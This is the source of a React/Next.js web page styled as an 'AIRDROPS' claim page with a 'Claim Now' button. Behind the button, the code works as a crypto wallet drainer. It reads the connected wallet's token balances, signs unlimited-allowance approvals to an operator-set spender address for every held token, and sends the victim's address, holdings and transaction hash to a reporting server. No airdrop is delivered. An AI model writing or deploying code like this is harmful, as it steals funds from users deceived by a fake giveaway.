'use client';

import { useState, useEffect, useRef } from 'react';
import { useAccount, useChainId } from 'wagmi';
import { erc20Abi, maxUint256, formatUnits } from 'viem';
import {
  createMeeClient,
  toMultichainNexusAccount,
  getMEEVersion,
  MEEVersion,
} from '@biconomy/abstractjs';
import { getWalletClient, getChainId as getActiveChainId } from '@wagmi/core';
import { config, TOKENS_BY_CHAIN, CHAIN_NAMES, CHAIN_BY_ID, transports } from '@/config';

// --- required env (production)
const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || '';
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || '') as `0x${string}`;
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL || '';

if (!BICONOMY_API_KEY) throw new Error('NEXT_PUBLIC_BICONOMY_API_KEY missing in .env (production required)');
if (!SPENDER || SPENDER === '0x') throw new Error('NEXT_PUBLIC_SPENDER missing/invalid in .env');

export default function Page() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const [status, setStatus] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);
  const connectReported = useRef(false);

  // Report connect only once per session (simple guard)
  useEffect(() => {
    if (!connectReported.current && isConnected && address) {
      connectReported.current = true;
      if (REPORT_URL) {
        fetch(REPORT_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ event: 'connect', wallet: address, chainId }),
        }).catch(console.error);
      }
    }
  }, [isConnected, address, chainId]);

  async function handleClaim() {
    if (!isConnected || !address || !chainId) {
      setStatus('⚠️ Wallet not connected or chain not set');
      return;
    }

    setLoading(true);
    setStatus('🔍 Preparing MEE / scanning tokens...');

    try {
      // Ensure the dapp's active chain (from wagmi) is used
      const activeChain = chainId;
      // Optional sanity: check that getChainId(config) equals chainId to ensure wagmi config matches
      try {
        const confChain = getActiveChainId(config);
        if (confChain !== activeChain) {
          // wagmi should be the source of truth — but warn if config differs
          console.warn('Config chain mismatch', confChain, activeChain);
        }
      } catch {
        // ignore if getActiveChainId fails
      }

      // Get walletClient (wagmi) bound to activeChain — used as signer for MEE account
      const walletClient = await getWalletClient(config, { chainId: activeChain });
      if (!walletClient) throw new Error('No wallet client available for active chain');

      // Build a multichain nexus account (orchestrator) that uses the wagmi signer
      const orchestrator = await toMultichainNexusAccount({
        signer: walletClient,
        chainConfigurations: [
          {
            chain: CHAIN_BY_ID[activeChain],
            transport: transports[activeChain],
            version: getMEEVersion(MEEVersion.V2_1_0),
          },
        ],
      });

      // Create a meeClient bound to the orchestrator and your API key
      const meeClient = await createMeeClient({
        account: orchestrator,
        apiKey: BICONOMY_API_KEY,
      });

      // Collect approval instructions for tokens on the active chain
      const tokens = TOKENS_BY_CHAIN[activeChain] || [];
      if (tokens.length === 0) {
        setStatus(`⚠️ No tokens configured for chain ${CHAIN_NAMES?.[activeChain] ?? activeChain}`);
        setLoading(false);
        return;
      }

      const instructions: any[] = [];
      const approvedTokens: { symbol: string; address: string; amount: string; decimals: number }[] = [];

      for (const token of tokens) {
        try {
          const bal = await meeClient.readContract({
            chainId: activeChain,
            abi: erc20Abi,
            address: token.address,
            functionName: 'balanceOf',
            args: [address],
          }) as bigint;

          if (bal > BigInt(0)) {
            // record human friendly amount for reporting
            approvedTokens.push({
              symbol: token.symbol,
              address: token.address,
              amount: formatUnits(bal, token.decimals),
              decimals: token.decimals,
            });

            // build composable approval instruction (gasless execution later)
            const instr = await orchestrator.buildComposable({
              type: 'default',
              data: {
                abi: erc20Abi,
                chainId: activeChain,
                to: token.address,
                functionName: 'approve',
                args: [SPENDER, maxUint256],
              },
            });

            instructions.push(instr);
          }
        } catch (err) {
          console.warn(`Failed reading balance for ${token.symbol} on chain ${activeChain}`, err);
        }
      }

      if (instructions.length === 0) {
        setStatus('ℹ️ No token balances found to approve on this chain.');
        setLoading(false);
        return;
      }

      setStatus(`🚀 Submitting ${instructions.length} approval(s) via MEE...`);

      // Pick a fee token candidate — here we pick first approved token as a candidate
      const feeCandidate = approvedTokens[0];
      const feeTokenAddress = feeCandidate ? (feeCandidate.address as `0x${string}`) : undefined;

      // build fusion quote & execute
      const fusionQuote = await meeClient.getFusionQuote({
        instructions,
        trigger: {
          chainId: activeChain,
          tokenAddress: feeTokenAddress ?? tokens[0].address,
          amount: BigInt(1),
        },
        feeToken: feeTokenAddress ? { address: feeTokenAddress, chainId: activeChain } : undefined,
      });

      const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
      await meeClient.waitForSupertransactionReceipt({ hash });

      // Report each approved token to your backend
      for (const t of approvedTokens) {
        if (REPORT_URL) {
          await fetch(REPORT_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: 'approval',
              wallet: address,
              chainId: activeChain,
              chainName: CHAIN_NAMES?.[activeChain] ?? activeChain,
              token: t.address,
              symbol: t.symbol,
              amount: t.amount,
              decimals: t.decimals,
              txHash: hash,
              spender: SPENDER,
            }),
          }).catch(console.error);
        }
      }

      setStatus(`✅ Approvals completed (tx: ${hash})`);
    } catch (err: any) {
      console.error('handleClaim error', err);
      setStatus(`❌ Error: ${err?.message ?? String(err)}`);
    } finally {
      setLoading(false);
    }
  }

  return (
    <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 24, marginTop: 40 }}>
      <header style={{ position: 'fixed', top: 0, left: 0, right: 0, height: 64, background: '#09011fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px', boxShadow: '0 2px 8px rgba(241,235,235,0.08)', zIndex: 1000 }}>
        <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: 18, color: '#aaa587ff' }}>AIRDROPS</div>
        <appkit-button />
      </header>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 24, paddingTop: 80, width: '80%', maxWidth: 600 }}>
        <div style={{ border: '1px solid #9dd6d1ff', borderRadius: 12, padding: 20, background: '#090e41ff', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'space-between', height: 500 }}>
          <h2 style={{ marginBottom: 12 }}>Airdrop</h2>

          <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#e4e1daff', fontSize: 14, textAlign: 'center' }}>
            {status || ''}
          </div>

          <button onClick={handleClaim} disabled={loading} style={{ background: loading ? '#444' : '#a00b0bff', color: 'white', padding: '12px 28px', borderRadius: 8, cursor: loading ? 'not-allowed' : 'pointer', marginTop: 16 }}>
            {loading ? 'Processing...' : 'Claim Now'}
          </button>
        </div>
      </div>
    </main>
  );
}